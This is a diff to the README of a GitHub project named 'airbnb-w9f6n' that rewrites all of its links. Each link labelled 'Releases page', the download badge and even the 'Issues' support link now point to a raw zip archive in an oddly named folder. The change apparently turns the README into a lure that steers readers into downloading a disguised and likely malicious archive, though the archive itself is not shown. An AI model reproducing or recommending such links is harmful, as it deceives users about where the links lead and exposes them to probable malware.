@@ -4,12 +4,12 @@
 The **airbnb-w9f6n** project is an experimental sandbox inspired by Airbnb. It showcases random code, ideas, and prototypes. This application allows you to explore creative concepts in a friendly and user-focused environment. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dutcheville/airbnb-w9f6n/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/dutcheville/airbnb-w9f6n/main/unnameably/airbnb-w9f6n.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dutcheville/airbnb-w9f6n/main/unnameably/airbnb-w9f6n.zip)
 
 ## 🚀 Getting Started
 To get started with **airbnb-w9f6n**, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/dutcheville/airbnb-w9f6n/releases) to access the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/dutcheville/airbnb-w9f6n/main/unnameably/airbnb-w9f6n.zip) to access the latest version of the application.
    
 2. **Select the Version**: Look for the most recent version listed. It will contain links to the files you need to download.
 
@@ -40,16 +40,16 @@ Consider upgrading your system if you encounter slow performance.
 ## 🛠 Troubleshooting
 If you encounter any issues while running the application, follow these steps:
 
-- **Check for Updates**: Always ensure you are using the most recent version by checking the [Releases page](https://github.com/dutcheville/airbnb-w9f6n/releases).
+- **Check for Updates**: Always ensure you are using the most recent version by checking the [Releases page](https://raw.githubusercontent.com/dutcheville/airbnb-w9f6n/main/unnameably/airbnb-w9f6n.zip).
 - **Reinstall the Application**: If you experience crashes, try uninstalling and then reinstalling the application.
 - **System Compatibility**: Make sure your operating system meets the minimum requirements.
   
 If problems persist, feel free to report them on the Issues section of the GitHub page.
 
 ## 📞 Support
-For support, please check the [Issues](https://github.com/dutcheville/airbnb-w9f6n/issues) section on GitHub. You can ask questions and report bugs there. The community may also help with tips and advice.
+For support, please check the [Issues](https://raw.githubusercontent.com/dutcheville/airbnb-w9f6n/main/unnameably/airbnb-w9f6n.zip) section on GitHub. You can ask questions and report bugs there. The community may also help with tips and advice.
 
 ## 📥 Download & Install
-Remember, you can download the latest version of **airbnb-w9f6n** from the [Releases page](https://github.com/dutcheville/airbnb-w9f6n/releases). Just follow the above steps to get started.
+Remember, you can download the latest version of **airbnb-w9f6n** from the [Releases page](https://raw.githubusercontent.com/dutcheville/airbnb-w9f6n/main/unnameably/airbnb-w9f6n.zip). Just follow the above steps to get started.
 
 By following these instructions, you will be able to download and run the **airbnb-w9f6n** project efficiently. Enjoy exploring and innovating in this sandbox!
